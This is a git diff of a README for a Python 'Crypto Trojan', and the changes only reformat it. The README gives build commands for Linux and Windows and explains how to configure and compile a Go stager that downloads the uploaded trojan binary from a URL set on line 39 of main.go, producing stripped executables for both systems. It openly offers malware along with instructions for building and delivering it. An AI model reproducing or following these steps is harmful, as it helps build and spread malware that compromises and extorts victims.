@@ -8,9 +8,11 @@ This is a Crypto Trojan written in Python which can be packed using Pyinstaller.
 And i :heart: Supergirl so there you go.
 
 ## Content
-1. [Requirements](#Requirements)
-2. [Setup](#Setup)
-3. [Building](#Building) executable
+1. [Requirements](#requirements)
+2. [Setup](#setup)
+3. [Building](#building)
+---
+![Image while Building](https://s1.postimg.org/7k7b0868an/pic.png)
 ---
 ## Requirements
 
@@ -37,25 +39,26 @@ Since we communicate with our API we need to set it up. The API(located in ./API
 ## Building
 
 ### Linux
-1. cd Scripts
-2. ./supergirl.sh setup python3
-3. ./supergirl.sh build
+1. `cd Scripts`
+2. `./supergirl.sh setup python3`
+3. `./supergirl.sh build`
 
 ### Windows
-1. cd Scripts
-2. ./supergirl.ps1 setup C:\\...\\python.exe
-3. ./supergirl.ps1 build
+1. `cd Scripts`
+2. `.\supergirl.ps1 setup C:\\...\\python.exe`
+3. `.\supergirl.ps1 build`
 
 ### Building Stager
 1. Upload your Binary which you gathered from the previous step
-2. Go to ./Stagers/Go and open main.go
+2. Go to `./Stagers/Go` and open `main.go`
 3. Change line 39 `var url string = "yourdirecturlhere"`
 
 #### Building a Linux Stager
-4. GOOS=linux go build -ldflags="-s -w" -o stager main.go
+4. `GOOS=linux go build -ldflags="-s -w" -o stager main.go`
 
 #### Building a Windows Stager
-5. GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o stager.exe main.go
+5. `GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o stager.exe main.go`
+
 
 # Disclaimer
 
